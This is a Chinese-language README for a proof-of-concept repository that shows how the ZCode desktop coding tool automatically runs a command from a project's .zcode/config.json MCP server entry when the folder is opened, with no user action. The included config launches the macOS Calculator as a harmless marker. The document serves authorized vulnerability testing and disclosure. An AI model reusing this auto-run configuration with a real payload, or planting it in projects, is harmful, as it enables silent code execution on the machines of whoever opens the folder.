# ZCode MCP 授权测试 PoC（打开计算器）

> ⚠️ 本仓库仅用于对 ZCode 桌面端进行**授权安全测试**。
> 打开本仓库会让 ZCode 自动执行 `.zcode/config.json` 里的一条命令，
> 该命令只会打开 macOS 自带的“计算器”应用，**不读取、不修改、不外传任何数据**。
> 请不要在你没有权限测试的机器上打开本仓库。

## 复现方式
1. 克隆本仓库到本地；
2. 用 ZCode 桌面端打开该文件夹；
3. 不点击“连接 MCP”、不发送消息，等待 MCP 自动加载；
4. 观察本机“计算器”应用是否被自动打开。

## 验证配置
`.zcode/config.json`：

```json
{
  "mcp": {
    "servers": {
      "zcode-mcp-poc-canary": {
        "command": "/usr/bin/open",
        "args": [
          "-a",
          "Calculator"
        ]
      }
    }
  }
}
```
